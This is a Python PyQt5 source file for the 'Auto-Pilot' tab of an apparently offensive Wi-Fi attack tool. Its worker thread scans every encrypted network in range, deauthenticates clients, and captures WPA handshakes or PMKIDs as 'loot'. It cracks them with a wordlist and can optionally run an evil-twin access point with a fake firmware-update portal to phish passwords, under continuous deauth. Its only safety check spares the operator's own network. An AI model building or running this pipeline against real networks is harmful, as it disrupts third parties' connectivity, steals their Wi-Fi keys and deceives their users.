"""
Auto-Pilot Tab — Fully autonomous Wi-Fi handshake capture + crack pipeline.

Phases:
  1. Interface Setup — detect a safe adapter, enable monitor mode
  2. Area Recon — broad airodump-ng sweep
  3. Targeted Capture — per-AP deauth + handshake sniff
  4. Auto-Crack — run crack_wpa_smart on each captured handshake
  5. Cleanup — restore managed mode, log results
"""

import logging
import time
import traceback
import shlex
import shutil
from pathlib import Path

from PyQt5.QtWidgets import (
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QPushButton,
    QLabel,
    QGroupBox,
    QTableWidget,
    QTableWidgetItem,
    QHeaderView,
    QPlainTextEdit,
    QProgressBar,
    QMessageBox,
    QSpinBox,
    QSplitter,
    QShortcut,
)
from PyQt5.QtCore import Qt, QThread, QTimer, pyqtSignal
from PyQt5.QtGui import QKeySequence
from PyQt5.QtGui import QColor, QFont

from james.gui.toast import show_toast
from james.gui.theme import TERMINAL_STYLE, LOG_STYLE

logger = logging.getLogger(__name__)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  Background Worker
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


class AutoPilotWorker(QThread):
    log_signal = pyqtSignal(str)
    phase_signal = pyqtSignal(int, str)  # phase_index, title
    loot_signal = pyqtSignal(dict)  # per-AP result dict
    finished_signal = pyqtSignal(bool)  # overall success

    TOTAL_PHASES = 6

    def __init__(
        self,
        orchestrator,
        recon_duration=20,
        deauth_attempts=3,
        auto_crack=True,
        auto_airgeddon=False,
        airgeddon_timeout=10,
    ):
        super().__init__()
        self.orchestrator = orchestrator
        self.is_running = True

        # Tunables
        self.recon_duration = recon_duration
        self.deauth_attempts = deauth_attempts
        self.auto_crack = auto_crack
        self.auto_airgeddon = auto_airgeddon
        self.airgeddon_timeout = airgeddon_timeout * 60  # convert to seconds

        self.loot_dir = Path.home() / ".james" / "loot" / "handshakes"
        self.loot_dir.mkdir(parents=True, exist_ok=True)

        self._mon_iface = None  # track for cleanup on crash

    # ── lifecycle ──────────────────────────────────────────────

    def run(self):
        try:
            self._do_workflow()
        except Exception as exc:
            tb = traceback.format_exc()
            self.log_signal.emit(f"❌ Auto-Pilot crashed:\n{tb}")
            logger.error("AutoPilot crash:\n%s", tb)
            # Best-effort cleanup
            self._safe_cleanup()
            self.finished_signal.emit(False)

    def stop(self):
        self.is_running = False
        self.log_signal.emit("🛑 Stop requested — finishing current step…")

    # ── helpers ────────────────────────────────────────────────

    def _log(self, msg: str):
        self.log_signal.emit(msg)
        logger.info("[AutoPilot] %s", msg)

    def _aborted(self) -> bool:
        """Check if the user hit STOP."""
        if not self.is_running:
            self._log("⏹ Aborted by user.")
            return True
        return False

    def _safe_cleanup(self):
        """Best-effort restore managed mode on crash or abort."""
        if self._mon_iface:
            try:
                self._log("Restoring interface to managed mode…")
                self.orchestrator.stop_monitor(self._mon_iface)
            except Exception as e:
                self._log(f"⚠ Cleanup error: {e}")

    # ── main workflow ─────────────────────────────────────────

    def _do_workflow(self):
        # ────────────────────────────────────────────────────
        # Phase 1 — Interface Setup
        # ────────────────────────────────────────────────────
        self.phase_signal.emit(1, "Phase 1/6: Interface Setup")
        self._log("Detecting wireless interfaces…")

        ifaces = self.orchestrator.wifi_interfaces()
        if not ifaces:
            self._log("❌ No wireless interfaces detected. Plug in an adapter.")
            self.finished_signal.emit(False)
            return

        self._log(f"Found {len(ifaces)} wireless interface(s):")
        for ifc in ifaces:
            self._log(f"  • {ifc['interface']}  mode={ifc.get('mode','?')}")

        # Use the NetworkGuard to pick a safe interface
        target_iface = None
        for ifc in ifaces:
            name = ifc["interface"]
            # Skip interfaces already in monitor (we might want them, but prefer managed ones we can promote)
            if ifc.get("mode", "").lower() == "monitor":
                target_iface = name  # usable as-is
                continue
            safe, reason = self.orchestrator.net_guard.check_monitor_safe(name)
            if safe:
                target_iface = name
                break
            else:
                self._log(f"  ⚠ Skipping {name}: {reason}")

        if not target_iface:
            self._log("❌ All interfaces are providing your internet connection.")
            self._log("   Plug in a second USB Wi-Fi adapter for attacks.")
            self.finished_signal.emit(False)
            return

        self._log(f"Selected interface: {target_iface}")

        # Enable monitor mode
        try:
            mon_iface = self.orchestrator.ensure_monitor_mode(target_iface)
        except RuntimeError as e:
            self._log(f"❌ Cannot enter monitor mode: {e}")
            self.finished_signal.emit(False)
            return

        self._mon_iface = mon_iface
        self._log(f"✅ Monitor mode active → {mon_iface}")

        if self._aborted():
            self._safe_cleanup()
            self.finished_signal.emit(False)
            return

        # ────────────────────────────────────────────────────
        # Phase 2 — Area Reconnaissance
        # ────────────────────────────────────────────────────
        self.phase_signal.emit(2, "Phase 2/6: Area Reconnaissance")
        self._log(f"Scanning for {self.recon_duration}s…")

        try:
            recon = self.orchestrator.scan_nearby_aps(
                mon_iface, duration=self.recon_duration
            )
        except Exception as e:
            self._log(f"❌ Recon failed: {e}")
            logger.exception("AutoPilot recon error")
            self._safe_cleanup()
            self.finished_signal.emit(False)
            return

        aps = recon.get("aps", [])
        encrypted = [ap for ap in aps if "OPN" not in ap.get("privacy", "")]

        self._log(f"Discovered {len(aps)} total APs, {len(encrypted)} encrypted.")

        if not encrypted:
            self._log("⚠ No encrypted APs in range. Nothing to capture.")
            self._safe_cleanup()
            self.finished_signal.emit(True)
            return

        # Sort by signal strength (strongest first — best chance of capture)
        encrypted.sort(key=lambda a: a.get("power", -100), reverse=True)

        for ap in encrypted:
            self._log(
                f"  📡 {ap.get('essid','<hidden>'):30s}  BSSID={ap.get('bssid','')}  "
                f"CH={ap.get('channel','')}  PWR={ap.get('power','?')}  "
                f"ENC={ap.get('privacy','?')}"
            )

        if self._aborted():
            self._safe_cleanup()
            self.finished_signal.emit(False)
            return

        # ────────────────────────────────────────────────────
        # Phase 3 — Targeted Handshake Capture
        # ────────────────────────────────────────────────────
        self.phase_signal.emit(3, "Phase 3/6: Handshake Capture")
        captured_files = []  # list of (ap_dict, cap_path)

        for idx, ap in enumerate(encrypted):
            if self._aborted():
                break

            bssid = ap.get("bssid", "")
            essid = ap.get("essid", "<hidden>")
            channel = ap.get("channel", "1")

            self._log(f"\n{'─'*50}")
            self._log(
                f"Target {idx+1}/{len(encrypted)}: {essid} ({bssid}) ch={channel}"
            )
            self._log(f"{'─'*50}")

            # Safety: don't deauth our own AP
            deauth_ok, deauth_reason = self.orchestrator.net_guard.check_deauth_safe(
                bssid
            )
            if not deauth_ok:
                self._log(f"⚠ SKIPPED (self-protection): {deauth_reason}")
                ap["captured"] = False
                ap["skip_reason"] = "self-protection"
                self.loot_signal.emit(ap)
                continue

            cap_prefix = f"/tmp/autopilot_{bssid.replace(':', '')}"
            cap_file = f"{cap_prefix}-01.cap"

            try:
                # Clean previous attempts
                self.orchestrator.layer.run(f"rm -f {cap_prefix}*")

                # Start focused capture
                self._log(f"Starting capture on ch {channel}…")
                proc = self.orchestrator.aircrack.start_airodump(
                    mon_iface,
                    channel=int(channel),
                    bssid=bssid,
                    write_prefix=cap_prefix,
                )

                found_handshake = False

                for attempt in range(1, self.deauth_attempts + 1):
                    if self._aborted():
                        break

                    self._log(f"  Deauth attempt {attempt}/{self.deauth_attempts}…")
                    try:
                        self.orchestrator.aircrack.deauth(mon_iface, bssid, count=15)
                    except Exception as e:
                        self._log(f"  ⚠ Deauth failed: {e}")

                    time.sleep(8)

                    if Path(cap_file).exists():
                        try:
                            if self.orchestrator.aircrack.check_handshake(
                                cap_file, bssid
                            ):
                                found_handshake = True
                                self._log(f"  ✅ Handshake captured!")
                                break
                        except Exception as e:
                            self._log(f"  ⚠ Handshake check error: {e}")

                # Stop capture process
                try:
                    self.orchestrator.layer.kill_background(proc)
                except Exception:
                    pass

                # PMKID fallback — clientless capture via hcxdumptool
                if not found_handshake and not self._aborted():
                    self._log(f"  🔄 Trying PMKID capture (clientless)…")
                    try:
                        pmkid_pcap = (
                            f"/tmp/autopilot_pmkid_{bssid.replace(':', '')}.pcapng"
                        )
                        self.orchestrator.layer.run(f"rm -f {pmkid_pcap}")
                        pmkid_result = self.orchestrator.hcxtools.capture_pmkid(
                            mon_iface, pmkid_pcap, timeout=20
                        )
                        # Check if we got anything
                        hc_out = (
                            f"/tmp/autopilot_pmkid_{bssid.replace(':', '')}.hc22000"
                        )
                        extract = self.orchestrator.hcxtools.extract_hashes(
                            pmkid_pcap, hc_out
                        )
                        if (
                            extract.get("pmkid_count", 0) > 0
                            or extract.get("eapol_count", 0) > 0
                        ):
                            found_handshake = True
                            cap_file = hc_out  # use the hash file directly
                            self._log(
                                f"  ✅ PMKID captured! ({extract.get('pmkid_count',0)} PMKID, {extract.get('eapol_count',0)} EAPOL)"
                            )
                        else:
                            self._log(f"  ❌ No PMKID from this AP.")
                    except Exception as e:
                        self._log(f"  ⚠ PMKID fallback error: {e}")

                # Save loot
                if found_handshake:
                    safe_name = (
                        "".join(c for c in essid if c.isalnum() or c in " -_").strip()
                        or "hidden"
                    )
                    final_path = (
                        self.loot_dir / f"{safe_name}_{bssid.replace(':', '')}.cap"
                    )
                    shutil.copy2(cap_file, final_path)
                    ap["loot_path"] = str(final_path)
                    ap["captured"] = True
                    captured_files.append((ap, str(final_path)))
                    self._log(f"  💾 Saved → {final_path}")
                else:
                    self._log(f"  ❌ No handshake or PMKID after all attempts.")
                    ap["captured"] = False

            except Exception as e:
                self._log(f"  ❌ Error on {essid}: {e}")
                logger.exception("AutoPilot capture error for %s", bssid)
                ap["captured"] = False

            self.loot_signal.emit(ap)

        if self._aborted():
            self._safe_cleanup()
            self.finished_signal.emit(False)
            return

        # ────────────────────────────────────────────────────
        # Phase 4 — Auto-Crack
        # ────────────────────────────────────────────────────
        self.phase_signal.emit(4, "Phase 4/6: Auto-Crack")

        if not captured_files:
            self._log("No handshakes to crack. Skipping.")
        elif not self.auto_crack:
            self._log("Auto-crack disabled. Use the Cracker tab to crack manually.")
        else:
            wordlist = self.orchestrator.find_wordlist("password")
            if not wordlist:
                self._log("⚠ No wordlist found — skipping auto-crack.")
                self._log(
                    "  Place a wordlist in ~/.james/wordlists/ or install rockyou.txt"
                )
            else:
                self._log(f"Using wordlist: {wordlist}")

                # Restore managed mode before cracking (cracking doesn't need monitor)
                self._log("Restoring managed mode for cracking phase…")
                try:
                    self.orchestrator.stop_monitor(mon_iface)
                    self._mon_iface = None
                except Exception:
                    pass

                for ap_data, cap_path in captured_files:
                    if self._aborted():
                        break
                    bssid = ap_data.get("bssid", "")
                    essid = ap_data.get("essid", "<hidden>")
                    self._log(f"\n🔓 Cracking {essid} ({bssid})…")

                    try:
                        result = self.orchestrator.crack_wpa_smart(
                            cap_path, wordlist, bssid=bssid, ssid=essid
                        )
                        if result.get("found"):
                            key = result.get("key", "")
                            self._log(f"  🔑 CRACKED: {key}")
                            ap_data["cracked"] = True
                            ap_data["key"] = key
                            # Persist to loot cache
                            try:
                                self.orchestrator.cache_cracked_key(
                                    bssid, key, method="autopilot", essid=essid
                                )
                            except Exception:
                                pass
                        else:
                            self._log(f"  🔒 Not cracked — key not in wordlist.")
                            ap_data["cracked"] = False
                    except Exception as e:
                        self._log(f"  ❌ Crack error: {e}")
                        logger.exception("AutoPilot crack error for %s", bssid)

                    # Re-emit loot with updated crack status
                    self.loot_signal.emit(ap_data)

        if self._aborted():
            self._safe_cleanup()
            self.finished_signal.emit(False)
            return

        # ────────────────────────────────────────────────────
        # Phase 5 — Auto-Airgeddon (Evil Twin)
        # ────────────────────────────────────────────────────
        self.phase_signal.emit(5, "Phase 5/6: Auto-Airgeddon")

        pineap = getattr(self, "pineap", None)

        if not self.auto_airgeddon:
            self._log("Auto-Airgeddon disabled. Skipping.")
        elif not pineap:
            self._log("⚠ PineAP module not injected, cannot launch portal.")
        else:
            uncracked = [
                (ap, cap) for ap, cap in captured_files if not ap.get("cracked")
            ]
            if not uncracked:
                self._log("No uncracked targets available for Evil Twin.")
            else:
                self._log(f"Found {len(uncracked)} uncracked targets for Evil Twin.")

                portal_iface = None
                ifaces = self.orchestrator.wifi_interfaces()
                for ifc in ifaces:
                    safe, _ = self.orchestrator.net_guard.check_monitor_safe(
                        ifc["interface"]
                    )
                    if safe:
                        portal_iface = ifc["interface"]
                        break

                if not portal_iface:
                    self._log("❌ No safe interface found for Evil Twin portal.")
                else:
                    from james.tools.pineap import CREDS_LOG

                    deauth_mon = None
                    if hasattr(self, "iface_combo"):
                        for i in range(self.iface_combo.count()):
                            name = self.iface_combo.itemData(i)
                            if name != portal_iface and "mon" in name:
                                deauth_mon = name
                                break

                    for ap_data, cap_path in uncracked:
                        if self._aborted():
                            break

                        bssid = ap_data.get("bssid", "")
                        essid = ap_data.get("essid", "<hidden>")
                        channel = ap_data.get("channel", "1")

                        self._log(
                            f"\n👿 Launching Evil Twin against {essid} ({bssid}) on ch {channel}"
                        )
                        self._log(
                            f"  Timeout set to {self.airgeddon_timeout // 60} minutes."
                        )

                        if CREDS_LOG.exists():
                            CREDS_LOG.unlink()
                        pineap.stop_all()

                        pineap.start_karma_with_portal(
                            interface=portal_iface,
                            channel=int(channel),
                            ssid=essid,
                            portal="firmware_update",
                            bssid=bssid,
                        )

                        deauth_proc = None
                        if deauth_mon:
                            self._log(f"  Using {deauth_mon} for continuous deauth.")
                            deauth_proc = self.orchestrator.layer.run_background(
                                f"aireplay-ng -0 0 -a {shlex.quote(bssid)} -D {shlex.quote(deauth_mon)}",
                                sudo=True,
                            )
                        else:
                            self._log(
                                f"  ⚠ No secondary monitor interface for continuous deauth. Attack relies on natural reconnection."
                            )

                        start_time = time.time()
                        valid_password = None
                        verified_creds = set()

                        while (
                            time.time() - start_time < self.airgeddon_timeout
                            and not self._aborted()
                        ):
                            time.sleep(3)
                            creds = pineap.get_creds()
                            for cred in creds:
                                pwd = cred.get("password")
                                if pwd and pwd not in verified_creds:
                                    verified_creds.add(pwd)
                                    self._log(
                                        f"  [PORTAL] Testing submitted password: {pwd}"
                                    )
                                    dict_path = "/tmp/james_autopilot_portal.txt"
                                    Path(dict_path).write_text(pwd + "\n")

                                    # Verify password with aircrack
                                    res = self.orchestrator.crack_wpa_smart(
                                        cap_path,
                                        dict_path,
                                        bssid=bssid,
                                        ssid=essid,
                                    )
                                    if res.get("found"):
                                        valid_password = pwd
                                        break
                            if valid_password:
                                break

                        if deauth_proc:
                            self.orchestrator.layer.kill_background(deauth_proc)

                        pineap.stop_all()

                        if valid_password:
                            self._log(f"  🎉 EVIL TWIN SUCCESS: {valid_password}")
                            ap_data["cracked"] = True
                            ap_data["key"] = valid_password
                            self.loot_signal.emit(ap_data)
                            try:
                                self.orchestrator.cache_cracked_key(
                                    bssid,
                                    valid_password,
                                    method="airgeddon",
                                    essid=essid,
                                )
                            except:
                                pass
                        elif not self._aborted():
                            self._log(f"  ⏳ Evil Twin timed out for {essid}.")

        # ────────────────────────────────────────────────────
        # Phase 6 — Cleanup & Summary
        # ────────────────────────────────────────────────────
        self.phase_signal.emit(6, "Phase 6/6: Cleanup & Report")
        self._safe_cleanup()
        self._mon_iface = None

        # Print summary
        total = len(encrypted)
        captured_count = sum(1 for a in encrypted if a.get("captured"))
        cracked_keys = [a for a in encrypted if a.get("cracked")]

        self._log(f"\n{'━'*50}")
        self._log(f"📊 AUTO-PILOT SUMMARY")
        self._log(f"{'━'*50}")
        self._log(f"  APs scanned:        {total}")
        self._log(f"  Handshakes captured: {captured_count}")
        self._log(f"  Keys cracked:        {len(cracked_keys)}")
        for a in cracked_keys:
            self._log(f"    🔑 {a.get('essid','?')} → {a.get('key','?')}")
        self._log(f"  Loot directory:      {self.loot_dir}")
        self._log(f"{'━'*50}")

        # Generate HTML report
        try:
            from james.core.report import generate_html_report, save_report

            loot_summary = self.orchestrator.get_loot_summary()
            tool_status = self.orchestrator.system_check()
            report_html = generate_html_report(
                task_log=self.orchestrator.export_log(),
                context={
                    "mode": "Auto-Pilot",
                    "recon_duration": f"{self.recon_duration}s",
                    "deauth_attempts": str(self.deauth_attempts),
                    "aps_found": str(total),
                    "captured": str(captured_count),
                    "cracked": str(len(cracked_keys)),
                },
                loot_summary=loot_summary,
                tool_status=tool_status,
                skills=[],
                known_targets={a.get("bssid", "") for a in encrypted},
            )
            report_path = save_report(report_html)
            self._log(f"  📄 Report saved → {report_path}")
        except Exception as e:
            self._log(f"  ⚠ Report generation failed: {e}")
            logger.exception("AutoPilot report error")

        self._log("✅ Auto-Pilot complete.")
        self.finished_signal.emit(True)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  GUI Tab
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


class AutoPilotTab(QWidget):
    def __init__(self, main_window):
        super().__init__()
        self.main_window = main_window
        self.orchestrator = main_window.orchestrator
        self.worker = None
        self._elapsed = 0
        self._elapsed_timer = QTimer(self)
        self._elapsed_timer.timeout.connect(self._tick_elapsed)
        self._build_ui()
        self._connect_signals()
        self._build_shortcuts()


    def _build_shortcuts(self):
        sc_s = QShortcut(QKeySequence("Ctrl+S"), self)
        sc_s.setContext(Qt.WidgetWithChildrenShortcut)
        sc_s.activated.connect(self._toggle_run)

    def _toggle_run(self):
        if self.btn_start.isEnabled():
            self.btn_start.click()
        elif self.btn_stop.isEnabled():
            self.btn_stop.click()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(16, 16, 16, 16)
        layout.setSpacing(12)

        layout.addLayout(self._build_action_row())
        layout.addLayout(self._build_settings_row())
        layout.addWidget(self._build_phase_strip())
        layout.addWidget(self._build_progress_bar())
        layout.addWidget(self._build_log_loot_splitter())

    def _build_action_row(self) -> QHBoxLayout:
        # ── Primary action row ──
        action_row = QHBoxLayout()
        action_row.setSpacing(8)
        self.btn_start = QPushButton("  START FULL AUTO-PILOT  ")
        self.btn_start.setToolTip("Start full Auto-Pilot (Ctrl+S)")
        self.btn_start.setObjectName("primaryBtn")
        self.btn_stop = QPushButton("Abort")
        self.btn_stop.setToolTip("Abort Auto-Pilot (Ctrl+S)")
        self.btn_stop.setObjectName("dangerBtn")
        self.btn_stop.setFixedWidth(80)
        self.btn_stop.setEnabled(False)
        action_row.addWidget(self.btn_start)
        action_row.addWidget(self.btn_stop)
        action_row.addStretch()
        return action_row

    def _build_settings_row(self) -> QHBoxLayout:
        # ── Settings row (flat, no group box) ──
        settings_row = QHBoxLayout()
        settings_row.setSpacing(12)

        recon_lbl = QLabel("Recon")
        recon_lbl.setObjectName("metaLabel")
        self.spin_recon = QSpinBox()
        self.spin_recon.setRange(5, 120)
        self.spin_recon.setValue(20)
        self.spin_recon.setFixedWidth(60)
        self.spin_recon.setToolTip("Seconds to scan before attacking")
        recon_sec = QLabel("sec")
        recon_sec.setObjectName("dimLabel")

        deauth_lbl = QLabel("Deauth")
        deauth_lbl.setObjectName("metaLabel")
        self.spin_deauth = QSpinBox()
        self.spin_deauth.setRange(1, 10)
        self.spin_deauth.setValue(3)
        self.spin_deauth.setFixedWidth(56)
        self.spin_deauth.setToolTip("Deauth attempts per target")
        deauth_x = QLabel("×")
        deauth_x.setObjectName("dimLabel")

        self.chk_crack = QPushButton("Auto-Crack")
        self.chk_crack.setCheckable(True)
        self.chk_crack.setChecked(True)
        self.chk_crack.setFixedHeight(28)
        self.chk_crack.setFixedWidth(96)
        self.chk_crack.setToolTip("Automatically crack captured handshakes")
        self.chk_crack.toggled.connect(self._toggle_crack)

        self.chk_airgeddon = QPushButton("Auto-Airgeddon")
        self.chk_airgeddon.setCheckable(True)
        self.chk_airgeddon.setChecked(False)
        self.chk_airgeddon.setFixedHeight(28)
        self.chk_airgeddon.setFixedWidth(120)
        self.chk_airgeddon.setToolTip("Deploy Evil Twin if cracking fails")
        self.chk_airgeddon.toggled.connect(self._toggle_airgeddon)

        et_lbl = QLabel("ET Timeout")
        et_lbl.setObjectName("metaLabel")
        self.spin_airgeddon_timeout = QSpinBox()
        self.spin_airgeddon_timeout.setRange(1, 60)
        self.spin_airgeddon_timeout.setValue(10)
        self.spin_airgeddon_timeout.setFixedWidth(60)
        et_min = QLabel("min")
        et_min.setObjectName("dimLabel")

        for w in (
            recon_lbl,
            self.spin_recon,
            recon_sec,
            deauth_lbl,
            self.spin_deauth,
            deauth_x,
            self.chk_crack,
            self.chk_airgeddon,
            et_lbl,
            self.spin_airgeddon_timeout,
            et_min,
        ):
            settings_row.addWidget(w)
        settings_row.addStretch()
        return settings_row

    def _build_phase_strip(self) -> QWidget:
        # ── Phase + metrics strip ──
        phase_strip = QWidget()
        phase_strip.setFixedHeight(48)
        phase_strip.setStyleSheet(
            "background: #181818; border: 1px solid #2B2B2B;" " border-radius: 6px;"
        )
        ps = QHBoxLayout(phase_strip)
        ps.setContentsMargins(16, 0, 16, 0)
        ps.setSpacing(24)

        self.lbl_phase = QLabel("Ready")
        self.lbl_phase.setObjectName("goldAccent")
        self.lbl_phase.setMinimumWidth(200)

        self._m_elapsed = self._make_strip_metric("Elapsed", "00:00")
        self._m_targets = self._make_strip_metric("Targets", "0")
        self._m_captured = self._make_strip_metric("Captured", "0")
        self._m_cracked = self._make_strip_metric("Cracked", "0")

        ps.addWidget(self.lbl_phase, stretch=1)
        for m in (
            self._m_elapsed,
            self._m_targets,
            self._m_captured,
            self._m_cracked,
        ):
            ps.addWidget(m)
        return phase_strip

    def _build_progress_bar(self) -> QProgressBar:
        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, AutoPilotWorker.TOTAL_PHASES)
        self.progress_bar.setValue(0)
        self.progress_bar.setTextVisible(False)
        self.progress_bar.setFixedHeight(4)
        return self.progress_bar

    def _build_log_loot_splitter(self) -> QSplitter:
        # ── Log + Loot splitter ──
        splitter = QSplitter(Qt.Horizontal)
        splitter.setHandleWidth(1)

        log_group = QGroupBox("Action Log")
        log_layout = QVBoxLayout(log_group)
        log_layout.setContentsMargins(8, 8, 8, 8)
        self.txt_log = QPlainTextEdit()
        self.txt_log.setReadOnly(True)
        self.txt_log.setMaximumBlockCount(2000)
        self.txt_log.setStyleSheet(LOG_STYLE)
        self.txt_log.setFont(QFont("JetBrains Mono", 13))
        log_layout.addWidget(self.txt_log)
        splitter.addWidget(log_group)

        loot_group = QGroupBox("Targets & Loot")
        loot_layout = QVBoxLayout(loot_group)
        loot_layout.setContentsMargins(8, 8, 8, 8)
        self.loot_table = QTableWidget()
        self.loot_table.setColumnCount(5)
        self.loot_table.setHorizontalHeaderLabels(["ESSID", "BSSID", "CH", "HS", "Key"])
        self.loot_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
        self.loot_table.horizontalHeader().setSectionResizeMode(4, QHeaderView.Stretch)
        self.loot_table.verticalHeader().setVisible(False)
        self.loot_table.setAlternatingRowColors(True)
        loot_layout.addWidget(self.loot_table)
        splitter.addWidget(loot_group)

        splitter.setSizes([480, 480])
        return splitter

    def _make_strip_metric(self, label: str, value: str) -> QWidget:
        w = QWidget()
        v = QVBoxLayout(w)
        v.setContentsMargins(0, 0, 0, 0)
        v.setSpacing(1)
        val = QLabel(value)
        val.setAlignment(Qt.AlignCenter)
        val.setStyleSheet(
            "color: #CCCCCC; font-size: 16px; font-weight: 700;"
            " font-family: 'JetBrains Mono', monospace;"
        )
        cap = QLabel(label)
        cap.setAlignment(Qt.AlignCenter)
        cap.setObjectName("metaLabel")
        v.addWidget(val)
        v.addWidget(cap)
        return w

    def _set_strip_metric(self, widget: QWidget, value: str, color: str = "#CCCCCC"):
        lbl = widget.findChildren(QLabel)[0]
        lbl.setText(value)
        lbl.setStyleSheet(
            f"color: {color}; font-size: 16px; font-weight: 700;"
            f" font-family: 'JetBrains Mono', monospace;"
        )

    def _tick_elapsed(self):
        self._elapsed += 1
        m, s = divmod(self._elapsed, 60)
        self._set_strip_metric(self._m_elapsed, f"{m:02d}:{s:02d}")

    def _connect_signals(self):
        self.btn_start.clicked.connect(self._on_start)
        self.btn_stop.clicked.connect(self._on_stop)

    def _toggle_crack(self, checked):
        self.chk_crack.setText(f"🔓 Auto-Crack: {'ON' if checked else 'OFF'}")

    def _toggle_airgeddon(self, checked):
        self.chk_airgeddon.setText(f"👿 Auto-Airgeddon: {'ON' if checked else 'OFF'}")

    # ── actions ────────────────────────────────────────────

    def _on_start(self):
        reply = QMessageBox.question(
            self,
            "Confirm Auto-Pilot",
            "Auto-Pilot will:\n"
            "• Detect and use a safe wireless adapter\n"
            "• Scan the area for encrypted networks\n"
            "• Deauthenticate clients to capture handshakes\n"
            "• Optionally auto-crack captured handshakes\n\n"
            "This is an aggressive operation. Proceed?",
            QMessageBox.Yes | QMessageBox.No,
        )
        if reply == QMessageBox.No:
            return

        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.txt_log.clear()
        self.loot_table.setRowCount(0)
        self.progress_bar.setValue(0)
        self.main_window._set_idle(False)
        self.main_window.lbl_status.setText("● AUTO-PILOT")

        # Reset elapsed timer
        self._elapsed = 0
        self._set_strip_metric(self._m_elapsed, "00:00")
        self._set_strip_metric(self._m_targets, "0")
        self._set_strip_metric(self._m_captured, "0")
        self._set_strip_metric(self._m_cracked, "0")
        self.lbl_phase.setText("Starting…")
        self.lbl_phase.setObjectName("goldAccent")
        self._elapsed_timer.start(1000)

        self.worker = AutoPilotWorker(
            self.orchestrator,
            recon_duration=self.spin_recon.value(),
            deauth_attempts=self.spin_deauth.value(),
            auto_crack=self.chk_crack.isChecked(),
            auto_airgeddon=self.chk_airgeddon.isChecked(),
            airgeddon_timeout=self.spin_airgeddon_timeout.value(),
        )
        # Inject pineap reference for the Evil Twin portal
        self.worker.pineap = self.main_window.wifi_tab.pineap
        self.worker.iface_combo = self.main_window.wifi_tab.iface_combo
        self.worker.log_signal.connect(self._log)
        self.worker.phase_signal.connect(self._update_phase)
        self.worker.loot_signal.connect(self._add_or_update_loot)
        self.worker.finished_signal.connect(self._on_finished)
        self.worker.start()

    def _on_stop(self):
        if self.worker and self.worker.isRunning():
            self.worker.stop()
            self.btn_stop.setEnabled(False)

    # ── slots ──────────────────────────────────────────────

    def _log(self, text):
        from datetime import datetime

        ts = datetime.now().strftime("%H:%M")
        self.txt_log.appendPlainText(f"[{ts}]  {text}")
        sb = self.txt_log.verticalScrollBar()
        sb.setValue(sb.maximum())
        self.main_window.log_signal.emit(f"[AutoPilot] {text}", "INFO")

    def _update_phase(self, idx, title):
        self.lbl_phase.setText(title)
        self.progress_bar.setValue(idx)
        self._set_strip_metric(self._m_targets, str(self.loot_table.rowCount()))

    def _add_or_update_loot(self, ap):
        """Insert or update a row in the loot table based on BSSID."""
        bssid = ap.get("bssid", "")

        # Check if this BSSID already exists (update for crack results)
        existing_row = None
        for row in range(self.loot_table.rowCount()):
            item = self.loot_table.item(row, 1)
            if item and item.text() == bssid:
                existing_row = row
                break

        row = existing_row if existing_row is not None else self.loot_table.rowCount()
        if existing_row is None:
            self.loot_table.insertRow(row)

        self.loot_table.setItem(row, 0, QTableWidgetItem(ap.get("essid", "")))
        self.loot_table.setItem(row, 1, QTableWidgetItem(bssid))
        self.loot_table.setItem(row, 2, QTableWidgetItem(str(ap.get("channel", ""))))

        # Handshake status
        hs_item = QTableWidgetItem()
        if ap.get("skip_reason"):
            hs_item.setText("SKIP")
            hs_item.setForeground(QColor("#3C3C3C"))
        elif ap.get("captured"):
            hs_item.setText("YES")
            hs_item.setForeground(QColor("#2EA043"))
        else:
            hs_item.setText("NO")
            hs_item.setForeground(QColor("#F85149"))
        self.loot_table.setItem(row, 3, hs_item)

        # Key status
        key_item = QTableWidgetItem()
        if ap.get("cracked"):
            key_item.setText(ap.get("key", ""))
            key_item.setForeground(QColor("#0078D4"))
        elif ap.get("captured"):
            key_item.setText("pending")
            key_item.setForeground(QColor("#6E7681"))
        else:
            key_item.setText("—")
            key_item.setForeground(QColor("#3C3C3C"))
        self.loot_table.setItem(row, 4, key_item)

        # Update strip metrics
        captured = sum(
            1
            for r in range(self.loot_table.rowCount())
            if self.loot_table.item(r, 3) and self.loot_table.item(r, 3).text() == "YES"
        )
        cracked = sum(
            1
            for r in range(self.loot_table.rowCount())
            if self.loot_table.item(r, 4)
            and self.loot_table.item(r, 4).text() not in ("", "—", "pending")
        )
        self._set_strip_metric(self._m_targets, str(self.loot_table.rowCount()))
        self._set_strip_metric(
            self._m_captured,
            str(captured),
            "#2EA043" if captured else "#CCCCCC",
        )
        self._set_strip_metric(
            self._m_cracked, str(cracked), "#0078D4" if cracked else "#CCCCCC"
        )

    def _on_finished(self, success):
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.main_window._set_idle(True)
        self._elapsed_timer.stop()

        if success:
            show_toast(self.main_window, "Auto-Pilot complete", level="success")
            self.lbl_phase.setText("Complete")
            self.lbl_phase.setStyleSheet(
                "color: #2EA043; font-size: 16px; font-weight: 700;"
            )
        else:
            show_toast(self.main_window, "Auto-Pilot stopped", level="error")
            self.lbl_phase.setText("Stopped")
            self.lbl_phase.setStyleSheet(
                "color: #F85149; font-size: 16px; font-weight: 700;"
            )
